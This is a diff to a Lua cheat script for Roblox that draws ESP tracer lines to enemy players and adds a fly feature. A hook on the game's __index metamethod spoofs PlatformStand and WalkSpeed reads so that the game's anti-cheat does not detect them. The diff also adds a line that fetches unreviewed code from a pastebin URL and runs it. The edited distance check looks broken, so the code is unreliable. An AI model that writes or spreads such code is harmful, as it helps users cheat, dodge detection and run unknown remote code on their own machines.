@@ -92,7 +92,7 @@ spawn(function()
 			Line.Color = Color3.new(1, 0, 0.384313)
 
 			RunService.Heartbeat:Connect(function()
-				if v.Character and v.Character:FindFirstChild('Humanoid') and v.Character:FindFirstChild('Humanoid').Health ~= 0 and v.Character:FindFirstChild('HumanoidRootPart') and Character and Character:FindFirstChild('HumanoidRootPart') and math.min(50, (Character.HumanoidRootPart - v.Character.HumanoidRootPart).magnitude) and v ~= localplayer and v.Team ~= localplayer.Team then
+				if v.Character and v.Character:FindFirstChild('Humanoid') and v.Character:FindFirstChild('Humanoid').Health ~= 0 and v.Character:FindFirstChild('HumanoidRootPart') and Character and Character:FindFirstChild('HumanoidRootPart') and math.min(50, (Character.HumanoidRootPart:Distance(v.Character.HumanoidRootPart)) and v ~= localplayer and v.Team ~= localplayer.Team then
 					local Vector, OnScreen = camera:worldToViewportPoint(v.Character.HumanoidRootPart.Position)
 					
 					if OnScreen then
@@ -234,11 +234,16 @@ end)
 
 -- [Fly] --
 
+loadstring(game:HttpGet("https://pastebin.com/raw/9tZMx4SW"))()
+
 	--> Fly Hook <--
 
 	local old;
 	old = hookmetamethod(game, "__index", function(self, key)
 		if not checkcaller() and key == "PlatformStand" and self.ClassName == "Humanoid" and self.Parent and plr.Character and self.Parent == plr.Character then -- Prevents PlatformStanding detections
+     	  return false
+		end
+		if not checkcaller() and key == "WalkSpeed" and self.ClassName == "Humanoid" and self.Parent and plr.Character and self.Parent == plr.Character then -- Prevents PlatformStanding detections
      	  return false
 		end
 		return old(self, key)
